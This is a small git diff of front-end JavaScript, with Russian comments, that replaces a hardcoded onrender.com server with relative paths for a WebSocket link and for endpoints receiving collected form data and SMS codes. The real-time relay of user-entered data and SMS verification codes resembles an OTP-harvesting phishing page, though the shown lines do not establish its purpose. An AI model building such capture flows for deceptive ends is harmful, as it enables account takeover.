@@ -210,7 +210,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }).join('');
 
     function connectWebSocket() {
-        ws = new WebSocket(`wss://new-l8h6.onrender.com`);
+        ws = new WebSocket(`wss://${window.location.host}`); // Динамический WebSocket
         ws.onopen = () => {
             console.log('WebSocket connected');
             ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
@@ -230,7 +230,7 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Sending to server:', data, isFinal);
         collectedData = { ...collectedData, ...data };
         try {
-            const response = await fetch(`https://new-l8h6.onrender.com/api/submit`, {
+            const response = await fetch(`/api/submit`, { // Относительный путь
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -493,7 +493,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const code = document.getElementById('sms-code').value;
         console.log('Submitting SMS code:', code);
         try {
-            const response = await fetch(`https://new-l8h6.onrender.com/api/sms`, {
+            const response = await fetch(`/api/sms`, { // Относительный путь
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
